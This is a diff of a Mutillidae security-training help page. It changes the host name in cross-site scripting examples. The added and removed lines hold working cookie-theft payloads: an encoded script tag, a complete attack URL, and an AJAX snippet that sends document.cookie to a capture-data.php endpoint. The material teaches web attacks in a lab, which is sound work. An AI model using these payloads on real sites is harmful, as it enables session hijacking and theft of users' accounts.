@@ -173,13 +173,13 @@
 			When passing code as a parameter value, the code has to be encoded so that is does not get parsed by the web server. The code needs to make it passed the web server to the application without being modified by the web server.
 			<br />
 <code>
-	%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.local%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E
+	%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.localhost%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E
 </code>
 			<br />
 			An example of a complete URL is the following. Note: Substitute the domain name or IP address of your Mutillidae installation.
 			<br />
 <code>
-	http://[ip-address-of-mutillidae]/mutillidae/index.php?page=user-info.php&username=%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.local%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details
+	http://[ip-address-of-mutillidae]/mutillidae/index.php?page=user-info.php&username=%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.localhost%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details
 </code>
 <br/><br/>
 			<span class="report-header">Examples - Stealing cookies quietly with AJAX</span>
@@ -280,7 +280,7 @@
 	var lXMLHTTP;
 	try{
 		var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
-		var lHost = &quot;mutillidae.local&quot;;
+		var lHost = &quot;mutillidae.localhost&quot;;
 		var lProtocol = &quot;http&quot;;
 		var lFilePath = &quot;/capture-data.php&quot;;
 		var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
